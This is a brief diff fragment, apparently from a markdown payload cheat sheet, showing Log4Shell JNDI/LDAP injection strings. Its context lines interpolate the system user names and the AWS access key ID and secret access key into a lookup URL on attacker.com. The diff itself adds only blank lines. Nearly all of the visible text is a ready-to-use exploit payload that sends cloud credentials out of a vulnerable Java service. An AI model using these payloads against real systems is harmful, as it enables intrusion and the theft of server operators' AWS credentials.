@@ -17,3 +17,5 @@ ${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/
 # AWS Access Key
 ${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
 ```
+
+
